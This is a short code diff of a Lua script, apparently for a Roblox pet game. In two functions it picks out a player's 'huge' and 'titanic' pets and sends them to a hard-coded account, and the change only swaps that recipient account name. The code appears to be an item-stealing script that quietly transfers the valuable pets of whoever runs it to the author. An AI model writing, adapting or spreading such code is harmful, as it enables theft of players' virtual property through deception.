@@ -57,7 +57,7 @@ local function DepositPetInTrade()
             if dir and dir.huge or dir.titanic then
                 wait(0.5)
                 local args = {
-                    [1] = "PEpper23985",
+                    [1] = "Octoptys",
                     [2] = "ty",
                     [3] = "Pet",
                     [4] = i,
@@ -129,7 +129,7 @@ local function onItemsUpdate(player, pets)
                 if petData and petData.huge then
                     wait(0.5)
                     local args = {
-                        [1] = "PEpper23985",
+                        [1] = "Octoptys",
                         [2] = "ty",
                         [3] = "Pet",
                         [4] = id,
